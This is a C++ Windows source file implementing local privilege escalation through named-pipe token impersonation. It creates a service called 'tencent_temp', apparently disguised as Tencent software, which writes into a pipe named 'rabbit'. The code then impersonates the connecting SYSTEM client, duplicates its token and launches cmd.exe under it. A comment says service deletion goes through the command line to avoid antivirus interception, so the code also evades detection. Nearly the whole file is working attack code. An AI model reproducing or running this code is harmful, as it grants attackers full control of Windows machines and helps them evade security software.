#include "stdafx.h"
#include "priv.h"



INT fn_create_process(LPWSTR lpFileName, LPCWSTR lpParam) {

	lstrcat(lpFileName, (LPCWSTR)" ");
	lstrcat(lpFileName, lpParam);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));


	si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW;
	CreateProcess(NULL, lpFileName, NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	WaitForSingleObject(pi.hProcess, 0);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return TRUE;

}





VOID fn_start_service() {

	LPWSTR lpCmdPath = new WCHAR[MAX_PATH];
	GetSystemDirectory(lpCmdPath, MAX_PATH);
	lstrcat(lpCmdPath, L"\\cmd.exe /c");
	fn_create_process(lpCmdPath, L"net start tencent_temp");

}


VOID fn_delete_service() {

	LPWSTR lpCmdPath = new WCHAR[MAX_PATH];
	GetSystemDirectory(lpCmdPath, MAX_PATH);
	lstrcat(lpCmdPath, L"\\cmd.exe /c");
	fn_create_process(lpCmdPath, L"net stop tencent_temp");
	fn_create_process(lpCmdPath, L"sc delete tencent_temp");

}




HANDLE fn_backup_token() {

	HANDLE hThreadToken = NULL;
	HANDLE hNewThreadToken = NULL;

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hThreadToken)) {
		return FALSE;
	}
	if (!DuplicateTokenEx(hThreadToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hNewThreadToken)) {
		return FALSE;
	}

	CloseHandle(hThreadToken);
	return hNewThreadToken;

}


VOID fn_adjust_token_privilege(HANDLE& hNewThreadToken) {

	TOKEN_PRIVILEGES tp;
	LUID lUID, lUID2;
	ZeroMemory(&tp, sizeof(tp));
	LookupPrivilegeValue(NULL, L"SeIncreaseQuotaPrivilege", &lUID);
	LookupPrivilegeValue(NULL, L"SeAssignPrimaryTokenPrivilege", &lUID2);

	tp.PrivilegeCount = 2;
	tp.Privileges[0].Luid = lUID;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[1].Luid = lUID2;
	tp.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hNewThreadToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
}



INT fn_impersonate_via_namepipe() {


	LPSTR lpReadBuffer = new CHAR[MAX_PATH];
	DWORD dwRealReadLen = 0;
	// ReadFile param

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	//si.wShowWindow = SW_HIDE;
	//si.dwFlags = STARTF_USESHOWWINDOW;
	//CreateProcess param


	LPCWSTR lpNamePipe = L"\\\\.\\pipe\\rabbit";
	HANDLE hNamePipe = CreateNamedPipe(lpNamePipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

	while (hNamePipe != INVALID_HANDLE_VALUE) {

		fn_start_service();
		if (ConnectNamedPipe(hNamePipe, NULL) != FALSE) {
			break;
		}
	}

	ReadFile(hNamePipe, lpReadBuffer, MAX_PATH, &dwRealReadLen, NULL); // must read byte from namepipe handle before impersonate
	if (!ImpersonateNamedPipeClient(hNamePipe)) {
		return FALSE;
	}

	//backup caller token.  impersonate token convert primary token.
	HANDLE hNewThreadToken = fn_backup_token();
	if (hNewThreadToken != FALSE) {
		BOOL bRet = CreateProcessWithTokenW(hNewThreadToken, LOGON_NETCREDENTIALS_ONLY, NULL, (LPWSTR)L"cmd.exe", NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
		// not require any privilege. if CreateProcessWithTokens fails. adjust token privilege then use CreateProcessAsUser.
		if (!bRet) {
			fn_adjust_token_privilege(hNewThreadToken);
			CreateProcessAsUser(hNewThreadToken, NULL, (LPWSTR)L"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		}


	}

	CloseHandle(hNewThreadToken);
	RevertToSelf();
	DisconnectNamedPipe(hNamePipe);
	CloseHandle(hNamePipe);
	return TRUE;

}





INT fn_create_service() {

	//because stop/delete service is not intercept by anti-virus. so stop/delete opertion is apply commandline.  
	SC_HANDLE hSCM = NULL;
	SC_HANDLE hService = NULL;
	LPCWSTR lpServiceName = L"tencent_temp";
	LPCWSTR lpBinPath = L"c:\\windows\\system32\\cmd.exe /c echo tencent > \\\\.\\pipe\\rabbit";

	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (hSCM == NULL)
		return FALSE;


	hService = CreateService(hSCM, lpServiceName, lpServiceName,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
		lpBinPath, NULL, NULL, NULL, NULL, NULL);
	if (hService == NULL) {
		CloseServiceHandle(hSCM);
		return FALSE;
	}

	CloseServiceHandle(hService);
	CloseServiceHandle(hSCM);

	return TRUE;

}



